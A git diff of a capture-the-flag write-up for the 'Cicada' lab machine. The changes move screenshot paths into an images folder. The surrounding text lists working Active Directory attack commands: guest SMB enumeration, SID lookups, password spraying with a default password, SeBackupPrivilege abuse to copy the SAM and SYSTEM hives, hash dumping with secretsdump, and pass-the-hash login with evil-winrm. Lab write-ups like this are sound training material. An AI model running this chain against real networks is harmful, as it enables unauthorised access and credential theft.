@@ -34,24 +34,24 @@ Findings
 ```bash
 crackmapexec - a popular tool to automate enumerating domains (including users, files/ directories, and shares)
 ```
-![alt text](image.png)
+![alt text](images/image.png)
 Note : if we specify any user the results would be much more better
 Lets take guest as user and no password.
 ```bash
 crackmapexec smb cicada.htb -u 'guest' -p '' --shares
 ```
-![alt text](image-1.png)
+![alt text](images/image-1.png)
 - We can see HR share and IPC$ shares are able to read by guest user.
 --------------------------------------------------------------------------------------------------------------------
 ### Smbclient
 ```bash
 smbclient  //cicada.htb/HR
 ```
-![alt text](image-2.png)
+![alt text](images/image-2.png)
 - Let's get the notice from HR.txt to kali
-![alt text](image-3.png)
-- And lets try reading what's inside the note---it seems we have default password for 1st time login 
-![alt text](image-4.png)
+![alt text](images/image-3.png)
+- And lets try reading what's inside the note---it seems we have default password for 1st time login
+![alt text](images/image-4.png)
 
 ----------------------------------------------------------------------------------------------------------------------
 ### Impackets - Impacket is an open-source toolkit
@@ -80,7 +80,7 @@ smbclient  //cicada.htb/HR
 ```bash
 impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass 
 ```
-![alt text](image-5.png)
+![alt text](images/image-5.png)
 - we find groups, users, and aliases within the domain
 
 - To view SID's 
@@ -115,7 +115,7 @@ sed 's/.*\\\(.*\) (SidTypeUser)/\1/'
 ```bash
  impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/'
 ```
-![alt text](image-6.png)
+![alt text](images/image-6.png)
 
 - Now lets create a user list text file and then using this and lets try the password-spray attack
 ### Password Spraying
@@ -124,15 +124,15 @@ sed 's/.*\\\(.*\) (SidTypeUser)/\1/'
 ```bash
 crackmapexec smb cicada.htb -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
 ```
-![alt text](image-7.png)
+![alt text](images/image-7.png)
 - We can observe that the user michael is still using the old default password given by the AD
-- Let's try login with the it 
-![alt text](image-8.png)
+- Let's try login with the it
+![alt text](images/image-8.png)
 - Since we don't have access to any of other servers a michel.wrightson user lets try to find the other users smb-shares with this user as below
 ```bash
 crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -- users 
 ```
-![alt text](image-9.png)
+![alt text](images/image-9.png)
 - This should give us the user descriptions data stored during the user creation. This might be not be empty sometimes.
 ### Foothold
 ----------------------------------------------------------------------------------
@@ -140,18 +140,18 @@ crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -
 ```bash
 crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares 
 ```
-![alt text](image-10.png)
+![alt text](images/image-10.png)
 - Good david have the more shares  permission than guest user.
 - Now lets try to connect using smbclient  to see all the share first lets try with DEV share
 ```bash
 smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
 ```
-![alt text](image-11.png)
+![alt text](images/image-11.png)
 - He is having a powershell script
-![alt text](image-12.png)
-- lets try to open it and we can see the pssword got converted into power shell string 
+![alt text](images/image-12.png)
+- lets try to open it and we can see the pssword got converted into power shell string
 - lets try to decrypt the string using the poweshell in kali,
-![alt text](image-13.png)
+![alt text](images/image-13.png)
 - It seems not working, lets try another method
 
 ### Evil-WinRm
@@ -164,7 +164,7 @@ WinRM must be enabled on the target.
 ```bash
 evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb 
 ```
-![alt text](image-14.png)
+![alt text](images/image-14.png)
 - We've successfully gotten a WinRM session
 
 ### Privilege Escalation
@@ -184,7 +184,7 @@ whoami /priv -  which will give you the Privilege Name  and its state (enables/d
 |SeLoadDriverPrivilege|Load and unload device drivers(Load malicious kernel drivers)|
 |SeTakeOwnershipPrivilege|Take ownership of files, folders, and registry keys (Change permissions on sensitive files)|
 
-![alt text](image-15.png)
+![alt text](images/image-15.png)
 
 
 - We can see SeBackupPrivilege - This privilege was designed to facilitate system backups and it enables access to system-protected files.
@@ -200,15 +200,15 @@ download system---->
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 - Now since we got the sam and system mail regestry as files.
 - Lets do the dumping process where the impackets will dump the user NTLM hashes.
-![alt text](image-16.png)
+![alt text](images/image-16.png)
 ```bash
 impacket-secretsdump -sam sam -system system local 
 ```
 - Note:  local - Indicates that the files are stored locally (not a live system).
-![alt text](image-17.png)
+![alt text](images/image-17.png)
 - We can use it to directly log in to the account with Evil-WinRM by passing it as a parameter with -H
 
 ```bash
 evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb 
 ```
-![alt text](image-18.png)
+![alt text](images/image-18.png)
